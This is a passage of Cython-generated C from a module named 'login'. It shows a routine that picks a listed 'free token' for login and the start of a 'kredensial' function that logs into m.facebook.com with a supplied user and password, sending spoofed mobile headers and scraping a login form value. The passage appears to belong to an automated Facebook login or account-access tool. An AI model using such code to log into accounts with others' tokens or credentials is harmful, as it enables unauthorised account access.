        if (__Pyx_GetException(&__pyx_t_4, &__pyx_t_3, &__pyx_t_2) < 0) __PYX_ERR(0, 204, __pyx_L7_except_error)
        __Pyx_GOTREF(__pyx_t_4);
        __Pyx_GOTREF(__pyx_t_3);
        __Pyx_GOTREF(__pyx_t_2);
        goto __pyx_L16_except_continue;
        __pyx_L16_except_continue:;
        __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
        __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
        __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
        goto __pyx_L11_try_continue;
      }
      __pyx_L7_except_error:;

      
      __Pyx_XGIVEREF(__pyx_t_9);
      __Pyx_XGIVEREF(__pyx_t_10);
      __Pyx_XGIVEREF(__pyx_t_11);
      __Pyx_ExceptionReset(__pyx_t_9, __pyx_t_10, __pyx_t_11);
      goto __pyx_L1_error;
      __pyx_L11_try_continue:;
      __Pyx_XGIVEREF(__pyx_t_9);
      __Pyx_XGIVEREF(__pyx_t_10);
      __Pyx_XGIVEREF(__pyx_t_11);
      __Pyx_ExceptionReset(__pyx_t_9, __pyx_t_10, __pyx_t_11);
      goto __pyx_L3_continue;
      __pyx_L12_try_end:;
    }

    
    __pyx_L3_continue:;
  }
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;

  
  __pyx_t_1 = PyTuple_New(3); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 205, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __pyx_t_7 = 0;
  __pyx_t_17 = 127;
  __Pyx_INCREF(__pyx_kp_u__4);
  __pyx_t_7 += 2;
  __Pyx_GIVEREF(__pyx_kp_u__4);
  PyTuple_SET_ITEM(__pyx_t_1, 0, __pyx_kp_u__4);
  __Pyx_GetModuleGlobalName(__pyx_t_2, __pyx_n_s_P); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 205, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __pyx_t_3 = __Pyx_PyObject_FormatSimple(__pyx_t_2, __pyx_empty_unicode); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 205, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_3);
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
  __pyx_t_17 = (__Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_3) > __pyx_t_17) ? __Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_3) : __pyx_t_17;
  __pyx_t_7 += __Pyx_PyUnicode_GET_LENGTH(__pyx_t_3);
  __Pyx_GIVEREF(__pyx_t_3);
  PyTuple_SET_ITEM(__pyx_t_1, 1, __pyx_t_3);
  __pyx_t_3 = 0;
  __Pyx_INCREF(__pyx_kp_u_Pilih_Nomer_Token_Untuk_Login);
  __pyx_t_7 += 36;
  __Pyx_GIVEREF(__pyx_kp_u_Pilih_Nomer_Token_Untuk_Login);
  PyTuple_SET_ITEM(__pyx_t_1, 2, __pyx_kp_u_Pilih_Nomer_Token_Untuk_Login);
  __pyx_t_3 = __Pyx_PyUnicode_Join(__pyx_t_1, 3, __pyx_t_7, __pyx_t_17); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 205, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_3);
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
  __pyx_t_1 = __Pyx_PyObject_CallOneArg(__pyx_builtin_input, __pyx_t_3); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 205, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
  __pyx_v_pil = __pyx_t_1;
  __pyx_t_1 = 0;

  
  __Pyx_INCREF(__pyx_v_pil);
  __pyx_t_1 = __pyx_v_pil;
  __pyx_t_13 = (__Pyx_PyUnicode_Equals(__pyx_t_1, __pyx_kp_u__16, Py_EQ)); if (unlikely(__pyx_t_13 < 0)) __PYX_ERR(0, 206, __pyx_L1_error)
  if (!__pyx_t_13) {
  } else {
    __pyx_t_14 = __pyx_t_13;
    goto __pyx_L18_bool_binop_done;
  }
  __pyx_t_13 = (__Pyx_PyUnicode_Equals(__pyx_t_1, __pyx_kp_u_, Py_EQ)); if (unlikely(__pyx_t_13 < 0)) __PYX_ERR(0, 206, __pyx_L1_error)
  __pyx_t_14 = __pyx_t_13;
  __pyx_L18_bool_binop_done:;
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
  __pyx_t_13 = (__pyx_t_14 != 0);
  if (__pyx_t_13) {

    
    __Pyx_GetModuleGlobalName(__pyx_t_3, __pyx_n_s_login); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 207, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_3);
    __pyx_t_2 = NULL;
    if (CYTHON_UNPACK_METHODS && unlikely(PyMethod_Check(__pyx_t_3))) {
      __pyx_t_2 = PyMethod_GET_SELF(__pyx_t_3);
      if (likely(__pyx_t_2)) {
        PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_3);
        __Pyx_INCREF(__pyx_t_2);
        __Pyx_INCREF(function);
        __Pyx_DECREF_SET(__pyx_t_3, function);
      }
    }
    __pyx_t_1 = (__pyx_t_2) ? __Pyx_PyObject_CallOneArg(__pyx_t_3, __pyx_t_2) : __Pyx_PyObject_CallNoArg(__pyx_t_3);
    __Pyx_XDECREF(__pyx_t_2); __pyx_t_2 = 0;
    if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 207, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_1);
    __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
    __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;

    
  }

  
  {
    __Pyx_PyThreadState_declare
    __Pyx_PyThreadState_assign
    __Pyx_ExceptionSave(&__pyx_t_11, &__pyx_t_10, &__pyx_t_9);
    __Pyx_XGOTREF(__pyx_t_11);
    __Pyx_XGOTREF(__pyx_t_10);
    __Pyx_XGOTREF(__pyx_t_9);
     {

      
      __Pyx_GetModuleGlobalName(__pyx_t_1, __pyx_n_s_freetoken); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 209, __pyx_L20_error)
      __Pyx_GOTREF(__pyx_t_1);
      __pyx_t_3 = __Pyx_PyNumber_Int(__pyx_v_pil); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 209, __pyx_L20_error)
      __Pyx_GOTREF(__pyx_t_3);
      __pyx_t_2 = __Pyx_PyInt_SubtractObjC(__pyx_t_3, __pyx_int_1, 1, 0, 0); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 209, __pyx_L20_error)
      __Pyx_GOTREF(__pyx_t_2);
      __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
      __pyx_t_3 = __Pyx_PyObject_GetItem(__pyx_t_1, __pyx_t_2); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 209, __pyx_L20_error)
      __Pyx_GOTREF(__pyx_t_3);
      __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
      __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
      __pyx_v_tolkau = __pyx_t_3;
      __pyx_t_3 = 0;

      
      __Pyx_GetModuleGlobalName(__pyx_t_2, __pyx_n_s_get_token); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 210, __pyx_L20_error)
      __Pyx_GOTREF(__pyx_t_2);
      __pyx_t_1 = NULL;
      if (CYTHON_UNPACK_METHODS && unlikely(PyMethod_Check(__pyx_t_2))) {
        __pyx_t_1 = PyMethod_GET_SELF(__pyx_t_2);
        if (likely(__pyx_t_1)) {
          PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_2);
          __Pyx_INCREF(__pyx_t_1);
          __Pyx_INCREF(function);
          __Pyx_DECREF_SET(__pyx_t_2, function);
        }
      }
      __pyx_t_3 = (__pyx_t_1) ? __Pyx_PyObject_Call2Args(__pyx_t_2, __pyx_t_1, __pyx_v_tolkau) : __Pyx_PyObject_CallOneArg(__pyx_t_2, __pyx_v_tolkau);
      __Pyx_XDECREF(__pyx_t_1); __pyx_t_1 = 0;
      if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 210, __pyx_L20_error)
      __Pyx_GOTREF(__pyx_t_3);
      __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
      __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;

      
    }
    __Pyx_XDECREF(__pyx_t_11); __pyx_t_11 = 0;
    __Pyx_XDECREF(__pyx_t_10); __pyx_t_10 = 0;
    __Pyx_XDECREF(__pyx_t_9); __pyx_t_9 = 0;
    goto __pyx_L25_try_end;
    __pyx_L20_error:;
    __Pyx_XDECREF(__pyx_t_1); __pyx_t_1 = 0;
    __Pyx_XDECREF(__pyx_t_16); __pyx_t_16 = 0;
    __Pyx_XDECREF(__pyx_t_18); __pyx_t_18 = 0;
    __Pyx_XDECREF(__pyx_t_2); __pyx_t_2 = 0;
    __Pyx_XDECREF(__pyx_t_3); __pyx_t_3 = 0;
    __Pyx_XDECREF(__pyx_t_4); __pyx_t_4 = 0;
    __Pyx_XDECREF(__pyx_t_5); __pyx_t_5 = 0;

    
    __pyx_t_6 = __Pyx_PyErr_ExceptionMatches(((PyObject *)(&((PyTypeObject*)PyExc_Exception)[0])));
    if (__pyx_t_6) {
      __Pyx_AddTraceback("login.freetokenv2", __pyx_clineno, __pyx_lineno, __pyx_filename);
      if (__Pyx_GetException(&__pyx_t_3, &__pyx_t_2, &__pyx_t_1) < 0) __PYX_ERR(0, 211, __pyx_L22_except_error)
      __Pyx_GOTREF(__pyx_t_3);
      __Pyx_GOTREF(__pyx_t_2);
      __Pyx_GOTREF(__pyx_t_1);
      __Pyx_INCREF(__pyx_t_2);
      __pyx_v_e = __pyx_t_2;
       {

        
        __pyx_t_4 = __Pyx_PyUnicode_FormatSafe(__pyx_kp_u_s, __pyx_v_e); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 212, __pyx_L31_error)
        __Pyx_GOTREF(__pyx_t_4);
        __pyx_t_5 = __Pyx_PyObject_CallOneArg(__pyx_builtin_exit, __pyx_t_4); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 212, __pyx_L31_error)
        __Pyx_GOTREF(__pyx_t_5);
        __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
        __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
      }

      
       {
        {
          __Pyx_DECREF(__pyx_v_e);
          __pyx_v_e = NULL;
          goto __pyx_L32;
        }
        __pyx_L31_error:;
        {
          __Pyx_PyThreadState_declare
          __Pyx_PyThreadState_assign
          __pyx_t_21 = 0; __pyx_t_22 = 0; __pyx_t_23 = 0; __pyx_t_24 = 0; __pyx_t_25 = 0; __pyx_t_26 = 0;
          __Pyx_XDECREF(__pyx_t_16); __pyx_t_16 = 0;
          __Pyx_XDECREF(__pyx_t_18); __pyx_t_18 = 0;
          __Pyx_XDECREF(__pyx_t_4); __pyx_t_4 = 0;
          __Pyx_XDECREF(__pyx_t_5); __pyx_t_5 = 0;
          if (PY_MAJOR_VERSION >= 3) __Pyx_ExceptionSwap(&__pyx_t_24, &__pyx_t_25, &__pyx_t_26);
          if ((PY_MAJOR_VERSION < 3) || unlikely(__Pyx_GetException(&__pyx_t_21, &__pyx_t_22, &__pyx_t_23) < 0)) __Pyx_ErrFetch(&__pyx_t_21, &__pyx_t_22, &__pyx_t_23);
          __Pyx_XGOTREF(__pyx_t_21);
          __Pyx_XGOTREF(__pyx_t_22);
          __Pyx_XGOTREF(__pyx_t_23);
          __Pyx_XGOTREF(__pyx_t_24);
          __Pyx_XGOTREF(__pyx_t_25);
          __Pyx_XGOTREF(__pyx_t_26);
          __pyx_t_6 = __pyx_lineno; __pyx_t_19 = __pyx_clineno; __pyx_t_20 = __pyx_filename;
          {
            __Pyx_DECREF(__pyx_v_e);
            __pyx_v_e = NULL;
          }
          if (PY_MAJOR_VERSION >= 3) {
            __Pyx_XGIVEREF(__pyx_t_24);
            __Pyx_XGIVEREF(__pyx_t_25);
            __Pyx_XGIVEREF(__pyx_t_26);
            __Pyx_ExceptionReset(__pyx_t_24, __pyx_t_25, __pyx_t_26);
          }
          __Pyx_XGIVEREF(__pyx_t_21);
          __Pyx_XGIVEREF(__pyx_t_22);
          __Pyx_XGIVEREF(__pyx_t_23);
          __Pyx_ErrRestore(__pyx_t_21, __pyx_t_22, __pyx_t_23);
          __pyx_t_21 = 0; __pyx_t_22 = 0; __pyx_t_23 = 0; __pyx_t_24 = 0; __pyx_t_25 = 0; __pyx_t_26 = 0;
          __pyx_lineno = __pyx_t_6; __pyx_clineno = __pyx_t_19; __pyx_filename = __pyx_t_20;
          goto __pyx_L22_except_error;
        }
        __pyx_L32:;
      }
      __Pyx_XDECREF(__pyx_t_3); __pyx_t_3 = 0;
      __Pyx_XDECREF(__pyx_t_2); __pyx_t_2 = 0;
      __Pyx_XDECREF(__pyx_t_1); __pyx_t_1 = 0;
      goto __pyx_L21_exception_handled;
    }
    goto __pyx_L22_except_error;
    __pyx_L22_except_error:;

    
    __Pyx_XGIVEREF(__pyx_t_11);
    __Pyx_XGIVEREF(__pyx_t_10);
    __Pyx_XGIVEREF(__pyx_t_9);
    __Pyx_ExceptionReset(__pyx_t_11, __pyx_t_10, __pyx_t_9);
    goto __pyx_L1_error;
    __pyx_L21_exception_handled:;
    __Pyx_XGIVEREF(__pyx_t_11);
    __Pyx_XGIVEREF(__pyx_t_10);
    __Pyx_XGIVEREF(__pyx_t_9);
    __Pyx_ExceptionReset(__pyx_t_11, __pyx_t_10, __pyx_t_9);
    __pyx_L25_try_end:;
  }

  

  
  __pyx_r = Py_None; __Pyx_INCREF(Py_None);
  goto __pyx_L0;
  __pyx_L1_error:;
  __Pyx_XDECREF(__pyx_t_1);
  __Pyx_XDECREF(__pyx_t_2);
  __Pyx_XDECREF(__pyx_t_3);
  __Pyx_XDECREF(__pyx_t_4);
  __Pyx_XDECREF(__pyx_t_5);
  __Pyx_XDECREF(__pyx_t_16);
  __Pyx_XDECREF(__pyx_t_18);
  __Pyx_AddTraceback("login.freetokenv2", __pyx_clineno, __pyx_lineno, __pyx_filename);
  __pyx_r = NULL;
  __pyx_L0:;
  __Pyx_XDECREF(__pyx_v_num);
  __Pyx_XDECREF(__pyx_v_url);
  __Pyx_XDECREF(__pyx_v_data);
  __Pyx_XDECREF(__pyx_v_token);
  __Pyx_XDECREF(__pyx_v_pil);
  __Pyx_XDECREF(__pyx_v_tolkau);
  __Pyx_XDECREF(__pyx_v_e);
  __Pyx_XGIVEREF(__pyx_r);
  __Pyx_RefNannyFinishContext();
  return __pyx_r;
}




static PyObject *__pyx_pw_5login_17kredensial(PyObject *__pyx_self, PyObject *__pyx_args, PyObject *__pyx_kwds); 
static PyMethodDef __pyx_mdef_5login_17kredensial = {"kredensial", (PyCFunction)(void*)(PyCFunctionWithKeywords)__pyx_pw_5login_17kredensial, METH_VARARGS|METH_KEYWORDS, 0};
static PyObject *__pyx_pw_5login_17kredensial(PyObject *__pyx_self, PyObject *__pyx_args, PyObject *__pyx_kwds) {
  PyObject *__pyx_v_user = 0;
  PyObject *__pyx_v_pw = 0;
  int __pyx_lineno = 0;
  const char *__pyx_filename = NULL;
  int __pyx_clineno = 0;
  PyObject *__pyx_r = 0;
  __Pyx_RefNannyDeclarations
  __Pyx_RefNannySetupContext("kredensial (wrapper)", 0);
  {
    static PyObject **__pyx_pyargnames[] = {&__pyx_n_s_user,&__pyx_n_s_pw,0};
    PyObject* values[2] = {0,0};
    if (unlikely(__pyx_kwds)) {
      Py_ssize_t kw_args;
      const Py_ssize_t pos_args = PyTuple_GET_SIZE(__pyx_args);
      switch (pos_args) {
        case  2: values[1] = PyTuple_GET_ITEM(__pyx_args, 1);
        CYTHON_FALLTHROUGH;
        case  1: values[0] = PyTuple_GET_ITEM(__pyx_args, 0);
        CYTHON_FALLTHROUGH;
        case  0: break;
        default: goto __pyx_L5_argtuple_error;
      }
      kw_args = PyDict_Size(__pyx_kwds);
      switch (pos_args) {
        case  0:
        if (likely((values[0] = __Pyx_PyDict_GetItemStr(__pyx_kwds, __pyx_n_s_user)) != 0)) kw_args--;
        else goto __pyx_L5_argtuple_error;
        CYTHON_FALLTHROUGH;
        case  1:
        if (likely((values[1] = __Pyx_PyDict_GetItemStr(__pyx_kwds, __pyx_n_s_pw)) != 0)) kw_args--;
        else {
          __Pyx_RaiseArgtupleInvalid("kredensial", 1, 2, 2, 1); __PYX_ERR(0, 214, __pyx_L3_error)
        }
      }
      if (unlikely(kw_args > 0)) {
        if (unlikely(__Pyx_ParseOptionalKeywords(__pyx_kwds, __pyx_pyargnames, 0, values, pos_args, "kredensial") < 0)) __PYX_ERR(0, 214, __pyx_L3_error)
      }
    } else if (PyTuple_GET_SIZE(__pyx_args) != 2) {
      goto __pyx_L5_argtuple_error;
    } else {
      values[0] = PyTuple_GET_ITEM(__pyx_args, 0);
      values[1] = PyTuple_GET_ITEM(__pyx_args, 1);
    }
    __pyx_v_user = values[0];
    __pyx_v_pw = values[1];
  }
  goto __pyx_L4_argument_unpacking_done;
  __pyx_L5_argtuple_error:;
  __Pyx_RaiseArgtupleInvalid("kredensial", 1, 2, 2, PyTuple_GET_SIZE(__pyx_args)); __PYX_ERR(0, 214, __pyx_L3_error)
  __pyx_L3_error:;
  __Pyx_AddTraceback("login.kredensial", __pyx_clineno, __pyx_lineno, __pyx_filename);
  __Pyx_RefNannyFinishContext();
  return NULL;
  __pyx_L4_argument_unpacking_done:;
  __pyx_r = __pyx_pf_5login_16kredensial(__pyx_self, __pyx_v_user, __pyx_v_pw);

  
  __Pyx_RefNannyFinishContext();
  return __pyx_r;
}

static PyObject *__pyx_pf_5login_16kredensial(CYTHON_UNUSED PyObject *__pyx_self, PyObject *__pyx_v_user, PyObject *__pyx_v_pw) {
  PyObject *__pyx_v_url = NULL;
  PyObject *__pyx_v_header = NULL;
  PyObject *__pyx_v_r = NULL;
  PyObject *__pyx_v_das = NULL;
  PyObject *__pyx_v_header1 = NULL;
  CYTHON_UNUSED PyObject *__pyx_v_po = NULL;
  PyObject *__pyx_v_headcok = NULL;
  PyObject *__pyx_v_data2 = NULL;
  PyObject *__pyx_v_find_token = NULL;
  PyObject *__pyx_v_token = NULL;
  PyObject *__pyx_v_cookie = NULL;
  PyObject *__pyx_r = NULL;
  __Pyx_RefNannyDeclarations
  PyObject *__pyx_t_1 = NULL;
  PyObject *__pyx_t_2 = NULL;
  PyObject *__pyx_t_3 = NULL;
  PyObject *__pyx_t_4 = NULL;
  PyObject *__pyx_t_5 = NULL;
  PyObject *__pyx_t_6 = NULL;
  PyObject *__pyx_t_7 = NULL;
  PyObject *__pyx_t_8 = NULL;
  PyObject *__pyx_t_9 = NULL;
  int __pyx_t_10;
  PyObject *__pyx_t_11 = NULL;
  int __pyx_t_12;
  int __pyx_t_13;
  PyObject *__pyx_t_14 = NULL;
  int __pyx_lineno = 0;
  const char *__pyx_filename = NULL;
  int __pyx_clineno = 0;
  __Pyx_RefNannySetupContext("kredensial", 0);

  
  {
    __Pyx_PyThreadState_declare
    __Pyx_PyThreadState_assign
    __Pyx_ExceptionSave(&__pyx_t_1, &__pyx_t_2, &__pyx_t_3);
    __Pyx_XGOTREF(__pyx_t_1);
    __Pyx_XGOTREF(__pyx_t_2);
    __Pyx_XGOTREF(__pyx_t_3);
     {

      
      __Pyx_INCREF(__pyx_kp_u_m_facebook_com);
      __pyx_v_url = __pyx_kp_u_m_facebook_com;

      
      __pyx_t_4 = __Pyx_PyDict_NewPresized(13); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 217, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_4);
      if (PyDict_SetItem(__pyx_t_4, __pyx_n_u_Host, __pyx_kp_u_m_facebook_com) < 0) __PYX_ERR(0, 217, __pyx_L3_error)
      if (PyDict_SetItem(__pyx_t_4, __pyx_kp_u_upgrade_insecure_requests, __pyx_kp_u_1_2) < 0) __PYX_ERR(0, 217, __pyx_L3_error)
      if (PyDict_SetItem(__pyx_t_4, __pyx_kp_u_user_agent, __pyx_kp_u_NokiaC3_00_5_0_08_63_Profile_MID) < 0) __PYX_ERR(0, 217, __pyx_L3_error)
      if (PyDict_SetItem(__pyx_t_4, __pyx_n_u_accept, __pyx_kp_u_text_html_application_xhtml_xml_2) < 0) __PYX_ERR(0, 217, __pyx_L3_error)
      if (PyDict_SetItem(__pyx_t_4, __pyx_n_u_dnt, __pyx_kp_u_1_2) < 0) __PYX_ERR(0, 217, __pyx_L3_error)
      if (PyDict_SetItem(__pyx_t_4, __pyx_kp_u_x_requested_with, __pyx_kp_u_mark_via_gp) < 0) __PYX_ERR(0, 217, __pyx_L3_error)
      if (PyDict_SetItem(__pyx_t_4, __pyx_kp_u_sec_fetch_site, __pyx_kp_u_same_origin) < 0) __PYX_ERR(0, 217, __pyx_L3_error)
      if (PyDict_SetItem(__pyx_t_4, __pyx_kp_u_sec_fetch_mode, __pyx_n_u_cors) < 0) __PYX_ERR(0, 217, __pyx_L3_error)
      if (PyDict_SetItem(__pyx_t_4, __pyx_kp_u_sec_fetch_user, __pyx_n_u_empty) < 0) __PYX_ERR(0, 217, __pyx_L3_error)
      if (PyDict_SetItem(__pyx_t_4, __pyx_kp_u_sec_fetch_dest, __pyx_n_u_document) < 0) __PYX_ERR(0, 217, __pyx_L3_error)
      if (PyDict_SetItem(__pyx_t_4, __pyx_n_u_referer, __pyx_kp_u_https_m_facebook_com) < 0) __PYX_ERR(0, 217, __pyx_L3_error)
      if (PyDict_SetItem(__pyx_t_4, __pyx_kp_u_accept_encoding, __pyx_kp_u_gzip_deflate_br) < 0) __PYX_ERR(0, 217, __pyx_L3_error)
      if (PyDict_SetItem(__pyx_t_4, __pyx_kp_u_accept_language, __pyx_kp_u_en_GB_en_US_q_0_9_en_q_0_8) < 0) __PYX_ERR(0, 217, __pyx_L3_error)
      __pyx_v_header = ((PyObject*)__pyx_t_4);
      __pyx_t_4 = 0;

      
      __Pyx_GetModuleGlobalName(__pyx_t_4, __pyx_n_s_ses); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 218, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_4);
      __pyx_t_5 = __Pyx_PyObject_GetAttrStr(__pyx_t_4, __pyx_n_s_get); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 218, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_5);
      __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
      __pyx_t_4 = __Pyx_PyDict_NewPresized(1); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 218, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_4);
      if (PyDict_SetItem(__pyx_t_4, __pyx_n_s_headers, __pyx_v_header) < 0) __PYX_ERR(0, 218, __pyx_L3_error)
      __pyx_t_6 = __Pyx_PyObject_Call(__pyx_t_5, __pyx_tuple__20, __pyx_t_4); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 218, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_6);
      __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
      __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
      __pyx_v_r = __pyx_t_6;
      __pyx_t_6 = 0;

      
      __pyx_t_6 = __Pyx_PyDict_NewPresized(6); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 219, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_6);
      __Pyx_GetModuleGlobalName(__pyx_t_7, __pyx_n_s_re); if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 219, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_7);
      __pyx_t_8 = __Pyx_PyObject_GetAttrStr(__pyx_t_7, __pyx_n_s_search); if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 219, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_8);
      __Pyx_DECREF(__pyx_t_7); __pyx_t_7 = 0;
      __pyx_t_7 = __Pyx_PyObject_GetAttrStr(__pyx_v_r, __pyx_n_s_text); if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 219, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_7);
      __pyx_t_9 = __Pyx_PyObject_CallOneArg(((PyObject *)(&PyUnicode_Type)), __pyx_t_7); if (unlikely(!__pyx_t_9)) __PYX_ERR(0, 219, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_9);
      __Pyx_DECREF(__pyx_t_7); __pyx_t_7 = 0;
      __pyx_t_7 = NULL;
      __pyx_t_10 = 0;
      if (CYTHON_UNPACK_METHODS && unlikely(PyMethod_Check(__pyx_t_8))) {
        __pyx_t_7 = PyMethod_GET_SELF(__pyx_t_8);
        if (likely(__pyx_t_7)) {
          PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_8);
          __Pyx_INCREF(__pyx_t_7);
          __Pyx_INCREF(function);
          __Pyx_DECREF_SET(__pyx_t_8, function);
          __pyx_t_10 = 1;
        }
      }
      #if CYTHON_FAST_PYCALL
      if (PyFunction_Check(__pyx_t_8)) {
        PyObject *__pyx_temp[3] = {__pyx_t_7, __pyx_kp_u_name_lsd_value, __pyx_t_9};
        __pyx_t_5 = __Pyx_PyFunction_FastCall(__pyx_t_8, __pyx_temp+1-__pyx_t_10, 2+__pyx_t_10); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 219, __pyx_L3_error)
        __Pyx_XDECREF(__pyx_t_7); __pyx_t_7 = 0;
        __Pyx_GOTREF(__pyx_t_5);
        __Pyx_DECREF(__pyx_t_9); __pyx_t_9 = 0;
      } else
      #endif
      #if CYTHON_FAST_PYCCALL
      if (__Pyx_PyFastCFunction_Check(__pyx_t_8)) {
        PyObject *__pyx_temp[3] = {__pyx_t_7, __pyx_kp_u_name_lsd_value, __pyx_t_9};
        __pyx_t_5 = __Pyx_PyCFunction_FastCall(__pyx_t_8, __pyx_temp+1-__pyx_t_10, 2+__pyx_t_10); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 219, __pyx_L3_error)
        __Pyx_XDECREF(__pyx_t_7); __pyx_t_7 = 0;
        __Pyx_GOTREF(__pyx_t_5);
        __Pyx_DECREF(__pyx_t_9); __pyx_t_9 = 0;
      } else
      #endif
      {
        __pyx_t_11 = PyTuple_New(2+__pyx_t_10); if (unlikely(!__pyx_t_11)) __PYX_ERR(0, 219, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_11);
        if (__pyx_t_7) {
          __Pyx_GIVEREF(__pyx_t_7); PyTuple_SET_ITEM(__pyx_t_11, 0, __pyx_t_7); __pyx_t_7 = NULL;
        }
        __Pyx_INCREF(__pyx_kp_u_name_lsd_value);
        __Pyx_GIVEREF(__pyx_kp_u_name_lsd_value);
        PyTuple_SET_ITEM(__pyx_t_11, 0+__pyx_t_10, __pyx_kp_u_name_lsd_value);
        __Pyx_GIVEREF(__pyx_t_9);
        PyTuple_SET_ITEM(__pyx_t_11, 1+__pyx_t_10, __pyx_t_9);
        __pyx_t_9 = 0;
        __pyx_t_5 = __Pyx_PyObject_Call(__pyx_t_8, __pyx_t_11, NULL); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 219, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_5);
        __Pyx_DECREF(__pyx_t_11); __pyx_t_11 = 0;
      }
      __Pyx_DECREF(__pyx_t_8); __pyx_t_8 = 0;
      __pyx_t_8 = __Pyx_PyObject_GetAttrStr(__pyx_t_5, __pyx_n_s_group); if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 219, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_8);
      __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
      __pyx_t_5 = NULL;
      if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_8))) {
        __pyx_t_5 = PyMethod_GET_SELF(__pyx_t_8);
        if (likely(__pyx_t_5)) {
          PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_8);
          __Pyx_INCREF(__pyx_t_5);
          __Pyx_INCREF(function);
          __Pyx_DECREF_SET(__pyx_t_8, function);
        }
      }
      __pyx_t_4 = (__pyx_t_5) ? __Pyx_PyObject_Call2Args(__pyx_t_8, __pyx_t_5, __pyx_int_1) : __Pyx_PyObject_CallOneArg(__pyx_t_8, __pyx_int_1);
      __Pyx_XDECREF(__pyx_t_5); __pyx_t_5 = 0;
      if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 219, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_4);
      __Pyx_DECREF(__pyx_t_8); __pyx_t_8 = 0;
      if (PyDict_SetItem(__pyx_t_6, __pyx_n_u_lsd, __pyx_t_4) < 0) __PYX_ERR(0, 219, __pyx_L3_error)
      __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
      __Pyx_GetModuleGlobalName(__pyx_t_5, __pyx_n_s_re); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 219, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_5);
      __pyx_t_11 = __Pyx_PyObject_GetAttrStr(__pyx_t_5, __pyx_n_s_search); if (unlikely(!__pyx_t_11)) __PYX_ERR(0, 219, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_11);
      __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
      __pyx_t_5 = __Pyx_PyObject_GetAttrStr(__pyx_v_r, __pyx_n_s_text); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 219, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_5);
